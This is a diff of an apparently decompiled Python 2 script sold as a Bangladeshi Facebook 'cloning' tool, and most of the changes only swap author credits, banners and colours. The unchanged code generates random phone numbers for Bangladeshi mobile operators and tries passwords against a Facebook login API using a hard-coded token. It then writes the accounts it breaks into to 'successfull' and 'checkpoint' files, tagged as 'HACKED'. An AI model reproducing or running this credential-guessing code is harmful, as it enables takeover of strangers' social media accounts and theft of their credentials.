@@ -1,12 +1,7 @@
-# DECRYPTED BY SDJ
-# Github : https://github.com/SHAHZAIN-SDJ
+# Decompile by FLAME NAIM
+
  #!/usr/bin/python
-# -*- coding: utf-8
  # uncompyle6 version 3.7.4
-# Python bytecode 2.7
-# Decompiled from: Python 2.7.18 (default, Aug  1 2021, 19:01:43) 
-# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
-# Embedded file name: James
 import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
 os.system('rm -rf .txt')
  
@@ -16,9 +11,23 @@ def psb(z):
         sys.stdout.flush()
         time.sleep(0.03)
  
+os.system('clear')
+print
  
-psb('\x1b[1;32mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT ..........')
-for n in range(5555):
+print
+ 
+print("""
+\033[0;94m ____  __  ___  ___  _  _  __  
+\033[0;94m(  _ \(  )/ __)/ __)/ )( \(  ) 
+\033[0;96m ) __/ )(( (__( (__ ) __ ( )(  
+\033[0;96m(__)  (__)\___)\___)\_)(_/(__) 
+ 
+""")
+
+print("\033[0;91mThis Tool's Free By Psycho Picchi")
+
+psb('\x1b[1;92mBANGLADESH 6 DIGIT CLONING START PLEASE WAIT .....')
+for n in range(90000):
     nmbr = random.randint(1111111, 9999999)
     sys.stdout = open('.txt', 'a')
     print nmbr
@@ -67,8 +76,15 @@ def t():
 def cb():
     os.system('clear')
  
+logo = """
+                                                                      
+\033[0;93m ____  __  ___  ___  _  _  __  
+\033[0;93m(  _ \(  )/ __)/ __)/ )( \(  ) 
+\033[0;96m ) __/ )(( (__( (__ ) __ ( )(  
+\033[0;96m(__)  (__)\___)\___)\_)(_/(__) 
  
-logo = '\n|..####....####...######..######..##..##..#####..\n|.##......##..##....##....##......##..##..##..##.\n|..####...######....##....####....##..##..#####..\n|.....##..##..##....##....##......##..##..##..##.\n|..####...##..##..######..##.......####...##..##.'
+"""
+
 back = 0
 successful = []
 cpb = []
@@ -79,18 +95,20 @@ def menu():
     os.system('clear')
     print logo
     print ''
-    print 'AUTHOR   : SAIFUR RAHMAN'
-    print 'FACEBOOK : facebook.com/abbu.2454'
-    print 'GITHUB     : github.com/SAIFUR-2009'
+    print '\033[0;93mAUTHOR   : PSYCH PICCHI'
+    print '\033[0;94mFACEBOOK : PSYCHO PICCHI'
+    print '\033[0;96mGITHUB   : PSYCHO-PICCHI'
     print ''
+    print '\033[0;90mONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
+    print '\033[0;91m'
     print 50* '-'
-    print 'ONLY BANGLADESHI ACCOUNTS ARE AVAILABLE'
-    print '[1]  \x1b[1;96mGP'
-    print '[2]  \x1b[1;92mRobi'
-    print '[3]  \x1b[1;96mAirtel'
-    print '[4]  \x1b[1;92mBanglalink'
-    print '[5]  \x1b[1;93mTeletalk'
-    print '[0]  \x1b[1;95mExit            '
+    print '\033[0;92m[1]  \x1b[1;93mGP'
+    print '\033[0;95m[2]  \x1b[1;95mRobi'
+    print '\033[0;94m[3]  \x1b[1;94mAirtel'
+    print '\033[0;92m[4]  \x1b[1;92mBanglalink'
+    print '\033[0;96m[5]  \x1b[1;96mTeletalk'
+    print '\033[0;90m[0]  \x1b[1;90mExit            '
+    print '\033[0;91m'
     print 50 * '-'
     action()
  
@@ -98,7 +116,7 @@ def menu():
 def action():
     global cpb
     global oks
-    bch = raw_input('\n  ===>   ')
+    bch = raw_input('\033[0;93m\n> ')
     if bch == '':
         print
         action()
@@ -110,7 +128,7 @@ def action():
         print '170,171, 172, 173, 174, 175, 176, 177, 178, 179,130,131, 132, 133, 134, 135, 136, 137, 138, 139'
         print''
         try:
-            c = raw_input(' Choose Code  : ')
+            c = raw_input('\033[0;93mChoose Code : ')
             k = '+880'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
@@ -129,7 +147,7 @@ def action():
         print '180,181, 182, 183, 184, 185, 186, 187, 188, 189'
         print''
         try:
-            c = raw_input(' Choose Code  : ')
+            c = raw_input('\033[0;93mChoose Code : ')
             k = '+880'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
@@ -148,7 +166,7 @@ def action():
         print '160,161, 162, 163, 164, 165, 166, 167, 168, 169'
         print''
         try:
-            c = raw_input(' Choose Code  : ')
+            c = raw_input('\033[0;93mChoose Code : ')
             k = '+880'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
@@ -167,7 +185,7 @@ def action():
         print '190,191, 192, 193, 194, 195, 196, 197, 198, 199,140,141, 142, 143, 144, 145, 146, 147, 148, 149'
         print''
         try:
-            c = raw_input(' Choose Code  : ')
+            c = raw_input('\033[0;93mChoose Code : ')
             k = '+880'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
@@ -186,7 +204,7 @@ def action():
         print '150,151, 152, 153, 154, 155, 156, 157, 158, 159'
         print''
         try:
-            c = raw_input(' Choose Code  : ')
+            c = raw_input('\033[0;93mChoose Code : ')
             k = '+880'
             idlist = '.txt'
             for line in open(idlist, 'r').readlines():
@@ -205,7 +223,7 @@ def action():
     xxx = str(len(id))
     psb('[\xe2\x9c\x93] Total Numbers: ' + xxx)
     time.sleep(0.5)
-    psb('[\xe2\x9c\x93] Please wait, process is running ...')
+    psb('[\xe2\x9c\x96] Please wait, process is running ...')
     time.sleep(0.5)
     psb('[!] To Stop Process Press CTRL Then Press z')
     time.sleep(0.5)
@@ -229,13 +247,13 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'access_token' in q:
-                print '\x1b[1;92m[SAIFUR-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                print '\x1b[1;92m[PSYCHO-HACKED]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                 okb = open('save/successfull.txt', 'a')
                 okb.write(k + c + user + '|' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;96m[SR-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;93m[ID OPEN ON 07 DAYS]\x1b[0m \n'
+                print '\x1b[1;91m[PICCHI-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
                 cps = open('save/checkpoint.txt', 'a')
                 cps.write(k + c + user + '|' + pass1 + '\n')
                 cps.close()
@@ -252,7 +270,7 @@ def action():
     '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
     print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
     raw_input('\n[Press Enter To Go Back]')
-    os.system('python2 Bangla.py')
+    os.system('python2 Psycho.py')
  
  
 if __name__ == '__main__':
